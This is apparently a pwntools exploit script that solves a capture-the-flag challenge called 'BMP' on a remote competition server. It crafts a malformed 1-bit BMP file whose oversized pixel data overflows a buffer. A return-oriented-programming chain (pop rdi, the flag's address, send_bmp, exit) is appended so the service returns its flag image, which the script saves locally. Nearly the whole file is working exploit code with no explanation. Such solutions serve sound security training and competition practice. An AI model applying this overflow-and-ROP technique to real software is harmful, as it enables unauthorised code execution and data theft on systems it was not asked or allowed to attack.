#!/usr/bin/env python3

from pwn import *
import struct
exe = ELF("./BMP")

context.binary = exe
#context.log_level = 'debug'
gdb_script = '''
    b *main
    b *main+306
'''
def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r, gdb_script)
    else:
        r = remote("pwn.hackini25.shellmates.club", 1400, ssl=True)

    return r


def main():
    r = conn()
    pop_rdi = 0x0000000000401936
    flag_addr = 0x00000000004040e0
    send_bmp_addr = exe.sym.send_bmp  

    # File Header (14 bytes)
    file_header = p16(0x4d42)   #     uint16_t bfType;
    file_header += p32(0xb80)   #     uint32_t bfSize;
    file_header += p16(0)       #     uint16_t bfReserved1;
    file_header += p16(0)       #     uint16_t bfReserved2;
    file_header += p32(0x3e)    #     uint32_t bfOffBits;

    # Image Header (40 bytes)
    image_header = p32(40)            # biSize
    image_header += p32(0x100)        # biWidth (calculates to 2848 bytes)
    image_header += p32(0x100)        # biHeight
    image_header += p16(1)            # biPlanes
    image_header += p16(1)            # biBitCount
    image_header += p32(0)            # biCompression (UNCOMPRESSED)
    image_header += p32(0)            # biSizeImage
    image_header += p32(0)            # biXPelsPerMeter
    image_header += p32(0)            # biYPelsPerMeter
    image_header += p32(2)            # biClrUsed
    image_header += p32(0)            # biClrImportant

    # Color Palette (8 bytes)
    palette = p64(0)

    rop = p64(pop_rdi)               # pop rdi; ret
    rop += p64(flag_addr)            # Address of FLAG
    rop += p64(send_bmp_addr)        # Call send_bmp(&FLAG)
    rop += p64(exe.sym.exit)

    
    payload = file_header + image_header + palette

    padding = 0x3e  # DATA_OFFSET
    data_size = 0xb00                          # > 0xb00 to cause overflow
    payload = payload.ljust(padding, b'\x00') + b"A"*(data_size +35) + b"BBBBCCC" + rop

    r.sendlineafter(b'Image (must be a 1 bit per pixel BMP file):', payload)

    r.recvuntil(b"here goes your BMP file i'll give it back to you\n")
    r.recvuntil(b"[*] Raw BMP\n")

    hdr = r.recv(14)
    _, sz, _, _, _ = struct.unpack('<HIHHI', hdr)

    # make sure we actually skip exactly (sz-14) bytes
    to_skip = sz - 14
    while to_skip > 0:
        chunk = r.recv(to_skip)
        to_skip -= len(chunk)

    # now we get the flag BMP
    r.recvuntil(b"[*] Raw BMP\n")

    # read its 14‑byte header
    flag_hdr = r.recv(14)
    bfType, bfSize, _, _, _ = struct.unpack('<HIHHI', flag_hdr)
    if bfType != 0x4D42:
        log.error("Not a BMP!")
        exit(1)

    # read exactly bfSize-14 bytes
    remaining = bfSize - 14
    flag_body = b''
    while len(flag_body) < remaining:
        chunk = r.recv(remaining - len(flag_body))
        if not chunk:
            log.error("Connection closed! got only %d/%d bytes", len(flag_body), remaining)
            break
        flag_body += chunk

    # write it out
    with open('leaked_flag.bmp', 'wb') as f:
        f.write(flag_hdr + flag_body)
    log.success(f"Wrote full {bfSize}-byte BMP to leaked_flag.bmp")

    r.close()


if __name__ == "__main__":
    main()
